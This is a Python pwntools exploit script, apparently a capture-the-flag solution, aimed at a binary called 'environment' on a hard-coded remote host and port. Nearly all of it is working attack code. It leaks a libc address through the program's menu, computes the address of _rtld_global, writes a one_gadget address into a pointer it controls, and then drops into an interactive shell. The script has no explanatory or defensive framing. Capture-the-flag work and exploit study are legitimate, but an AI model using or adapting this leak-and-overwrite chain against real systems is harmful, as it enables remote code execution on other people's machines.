#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 138.68.147.232 --port 31261 ./environment
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./environment')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '138.68.147.232'
port = int(args.PORT or 31261)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x0000000000401466
# b *0x0000000000401357
b *0x00000000004010b5
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
win = 0x00000000004010b5
if args.LOCAL:
    libc = exe.libc
else:
    libc = ELF("./libc.so.6")

def recy():
    io.sendlineafter("> ","2")
    io.sendlineafter("> ","1")
    io.sendlineafter("> ","n")

for _ in range(9):
    recy()

io.recvline()
io.recvuntil("[")
io.recvuntil("[")
io.recvuntil("[")

leak = int(io.recvuntil("]",drop=1),16)
libc.address = leak - libc.sym["printf"]
print hex(libc.address)
rtld_global = libc.sym["_rtld_global"]
print hex(rtld_global)

recy()
p = str(rtld_global)
p = p.ljust(10,"\x00")
io.sendafter("> ",p)

to = (io.recvline()[4:-1]).ljust(8,"\x00")
print len(to)
#+2312
to = u64(to) +3848
print hex(to)

# to = libc.symbols['_IO_file_jumps'] + (8*0)
# print bytes((to))
# to = 0x0000000000602d68
# to = libc.symbols['__malloc_hook']
off = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadget = libc.address + off[1]

io.sendlineafter("> ","1")
#
p =str(to)
p = p.ljust(9,"\x00")
io.sendafter("> ",p)
p =str(one_gadget)
p = p.ljust(9,"\x00")
io.sendafter("> ",p)





io.interactive()
